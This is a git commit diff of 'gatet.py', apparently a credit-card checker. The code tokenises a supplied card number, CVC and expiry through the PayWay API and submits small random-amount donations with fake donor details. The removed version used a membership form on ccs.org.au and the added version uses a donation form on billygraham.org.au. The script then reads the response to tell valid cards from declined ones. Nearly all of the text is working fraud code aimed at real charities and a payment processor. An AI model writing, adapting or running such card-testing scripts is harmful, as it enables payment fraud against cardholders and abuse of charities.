da6429e5027ee9833547d413f1e6f22e1f085e55
Rodamuser08 <rodamuser08@gmail.com>
2025-06-28 09:28:26 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -17,155 +17,102 @@ def Tele(ccx):
 	random_amount1 = random.randint(1, 9)
 	random_amount2 = random.randint(1, 99)
 	
-	headers = {
-	    'authority': 'www.ccs.org.au',
-	    'accept': '*/*',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://www.ccs.org.au',
-	    'referer': 'https://www.ccs.org.au/how-to-get-involved/membership/',
-	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
+	url = "https://api.payway.com.au/rest/v1/single-use-tokens"
+	
+	payload = {
+	  'paymentMethod': "creditCard",
+	  'connectionType': "FRAME",
+	  'cardNumber': n,
+	  'cvn': cvc,
+	  'cardholderName': "Dao Khao Saard",
+	  'expiryDateMonth': mm,
+	  'expiryDateYear': yy,
+	  'threeDS2': "false"
 	}
-	
-	data = {
-	    'input_22': '',
-	    'input_23': '',
-	    'input_2': '',
-	    'input_15': '',
-	    'input_24': '',
-	    'input_25': '',
-	    'input_38': '',
-	    'input_26': '',
-	    'input_5[]': [
-	        '',
-	        '',
-	        '',
-	    ],
-	    'input_35': 'Ordinary Membership $5|5',
-	    'input_7': 'Applying to be a member for the first time',
-	    'input_11': f'$ {random_amount1}.{random_amount2}',
-	    'input_39.1': '',
-	    'input_39.2': '',
-	    'input_40': '',
-	    'gform_submission_method': 'postback',
-	    'gform_theme': 'gravity-theme',
-	    'gform_style_settings': '[]',
-	    'is_submit_45': '1',
-	    'gform_submit': '45',
-	    'gform_unique_id': '',
-	    'state_45': 'WyJ7XCIzNVwiOltcIjA4ZGQ0MTQwNzM5MzNmY2IwZDRiN2E3MDY3ZGE0M2VlXCIsXCI4OWYzZmYyY2I1Y2JkYzM1YTc4OTgzNmFiZWM0ZWFiYlwiXX0iLCI3OGFhNzllZjYwNGYxZmQ3MTQ5MWE5YWM4ZWUwNjYxZCJd',
-	    'gform_target_page_number_45': '0',
-	    'gform_source_page_number_45': '1',
-	    'gform_field_values': '',
-	    'gform_save': 'true',
-	}
-	
-	response = session.post('https://www.ccs.org.au/wp-json/gf/v2/forms/45/submissions', headers=headers, data=data)
-	
-	resume_token = re.search(r'"resume_token":"(.*?)"', response.text).group(1)
 	
 	headers = {
-	    'authority': 'api.payway.com.au',
-	    'accept': 'application/json',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'authorization': 'Basic UTEyNDA5X1BVQl93NGJwajJqdHY4MmZoZmFwZnFqZ3RuOGp1ZGF1cDk3YWlpN3d4MmluaHdlZWhjMnEzcXp1MmVuaTNrZTc6',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://api.payway.com.au',
-	    'referer': 'https://api.payway.com.au/rest/v1/creditCard-iframe.htm',
-	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	    'x-no-authenticate-basic': 'true',
-	    'x-requested-with': 'XMLHttpRequest',
+	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
+	  'Accept': "application/json",
+	  'authority': "api.payway.com.au",
+	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
+	  'authorization': "Basic UTEwNzM1X1BVQl9xdzdqc2dqdzlxZXM0dGdzN255N3RpencycGtxdWJzc2pmbmlyZjZpYzI1cjZrZXhmOWJkbTJxa2Z2YnY6",
+	  'origin': "https://api.payway.com.au",
+	  'referer': "https://api.payway.com.au/rest/v1/creditCard-iframe.htm",
+	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
+	  'sec-ch-ua-mobile': "?1",
+	  'sec-ch-ua-platform': "\"Android\"",
+	  'sec-fetch-dest': "empty",
+	  'sec-fetch-mode': "cors",
+	  'sec-fetch-site': "same-origin",
+	  'x-no-authenticate-basic': "true",
+	  'x-requested-with': "XMLHttpRequest"
 	}
 	
-	data = {
-	    'paymentMethod': 'creditCard',
-	    'connectionType': 'FRAME',
-	    'cardNumber': n,
-	    'cvn': cvc,
-	    'cardholderName': 'Dao Khao Saard',
-	    'expiryDateMonth': mm,
-	    'expiryDateYear': yy,
-	    'threeDS2': 'false',
-	}
-	
-	response = session.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, data=data)
+	response = session.post(url, data=payload, headers=headers)
 	
 	tok = response.json()['singleUseTokenId']
 	
+	url = "https://billygraham.org.au/donate/your-gift-to-rapid-response-team/"
+	
+	payload = {
+	  'input_3': 'Other amount|0',
+	  'input_4': f'$ {random_amount1}.{random_amount2}',
+	  'input_5': f'$ {random_amount1}.{random_amount2}',
+	  'input_1.3': 'Rodam',
+	  'input_1.6': 'User',
+	  'input_9.1': 'Street 27',
+	  'input_9.2': '',
+	  'input_9.3': 'New York',
+	  'input_9.4': 'New York',
+	  'input_9.5': '10080',
+	  'input_9.6': 'United States',
+	  'gpaa_place_9': '',
+	  'input_2': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
+	  'input_2_2': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
+	  'input_18': '',
+	  'input_13': '',
+	  'input_11.1': '',
+	  'input_11.2': tok,
+	  'input_12.1': '1',
+	  'input_12.2': 'I have read and agree to the <a target="_blank" href="https://billygraham.org.au/terms-conditions-privacy-policy/">website terms and conditions*</a>',
+	  'input_12.3': '4',
+	  'input_17': '',
+	  'input_22': '',
+	  'gform_submission_method': 'postback',
+	  'gform_theme': 'gravity-theme',
+	  'gform_style_settings': '{"inputPrimaryColor":"#204ce5"}',
+	  'is_submit_10': '1',
+	  'gform_submit': '10',
+	  'gform_unique_id': '',
+	  'state_10': 'WyJ7XCIzXCI6W1wiMmYxYThlMWZmM2ZlYjViZDMxZTBjNjc0YmU4NDVkMGJcIixcIjJhZTcyMmY3NjFkYjliZTY3MTAyOTZiMzk0ZDE3NDNlXCIsXCI4YjQ2ODU4ZDZmYTYwODQ4YTQ5OGUzOTQyN2U5YmY3MlwiLFwiZGU1ZGY2MmZhMjIzNGNhYzY2OWJjZjA2MjZmZmIzY2JcIl0sXCIxMi4xXCI6XCI1OWU3ZDY2MjA4M2EyYWVmMDk5ZTk2Y2JiZWViYTM5OVwiLFwiMTIuMlwiOlwiMzExMjE1MjBkZjhjNjI0NjBiMmZkNDUyZTQ3ZDlmZjNcIixcIjEyLjNcIjpcImRiMDAwODI5ZDJjMzQyZmEyYjM2YWIzN2NlM2JlMDM1XCJ9IiwiYjQ2YzQwYTk5NTVhNzZlOTI3NTM4MzFjZWQ5Y2NiMmMiXQ==',
+	  'gform_target_page_number_10': '0',
+	  'gform_source_page_number_10': '1',
+	  'gform_field_values': '',
+	  'version_hash': '427f05281b954394d96085c37c6d7882'
+	}
+	
 	headers = {
-	    'authority': 'www.ccs.org.au',
-	    'accept': '*/*',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://www.ccs.org.au',
-	    'referer': 'https://www.ccs.org.au/how-to-get-involved/membership/',
-	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
+	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
+	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+	  'authority': "billygraham.org.au",
+	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
+	  'cache-control': "max-age=0",
+	  'origin': "https://billygraham.org.au",
+	  'referer': "https://billygraham.org.au/donate/your-gift-to-rapid-response-team/",
+	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
+	  'sec-ch-ua-mobile': "?1",
+	  'sec-ch-ua-platform': "\"Android\"",
+	  'sec-fetch-dest': "document",
+	  'sec-fetch-mode': "navigate",
+	  'sec-fetch-site': "same-origin",
+	  'sec-fetch-user': "?1",
+	  'upgrade-insecure-requests': "1"
 	}
 	
-	data = {
-	    'input_22': 'Rodam',
-	    'input_23': 'User',
-	    'input_2': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
-	    'input_15': '4303000850',
-	    'input_24': 'Street 27',
-	    'input_25': 'New York',
-	    'input_38': 'New York',
-	    'input_26': '10080',
-	    'input_5[]': [
-	        '3',
-	        '10',
-	        '2001',
-	    ],
-	    'input_35': 'Ordinary Membership $5|5',
-	    'input_7': 'Applying to be a member for the first time',
-	    'input_36': 'No',
-	    'input_37.1': 'I confirm and acknowledge my details',
-	    'input_11': f'$ {random_amount1}.{random_amount2}',
-	    'input_39.1': '',
-	    'input_39.2': tok,
-	    'input_40': '',
-	    'gform_submission_method': 'postback',
-	    'gform_theme': 'gravity-theme',
-	    'gform_style_settings': '[]',
-	    'is_submit_45': '1',
-	    'gform_submit': '45',
-	    'gform_unique_id': '',
-	    'state_45': 'WyJ7XCIzNVwiOltcIjA4ZGQ0MTQwNzM5MzNmY2IwZDRiN2E3MDY3ZGE0M2VlXCIsXCI4OWYzZmYyY2I1Y2JkYzM1YTc4OTgzNmFiZWM0ZWFiYlwiXX0iLCI3OGFhNzllZjYwNGYxZmQ3MTQ5MWE5YWM4ZWUwNjYxZCJd',
-	    'gform_target_page_number_45': '0',
-	    'gform_source_page_number_45': '1',
-	    'gform_field_values': '',
-	    'resume_token': resume_token,
-	    'version_hash': '86790a319b47691ce4f0a8115c7e15c0',
-	}
-	
-	response = session.post(
-	    'https://www.ccs.org.au/how-to-get-involved/membership/',
-	    headers=headers,
-	    data=data,
-	)
+	response = session.post(url, data=payload, headers=headers)
 	
 	try:
-		result = re.search(r'class="validation_error">(.*?)<\/div>', response.text).group(1)
+		result = re.search(r'#8211; (.*?)<\/a><\/li><\/ol><\/div>', response.text).group(1)
 	except:
 		result = re.search(r'<h4>(.*?)<\/h4>', response.text).group(1)
 		
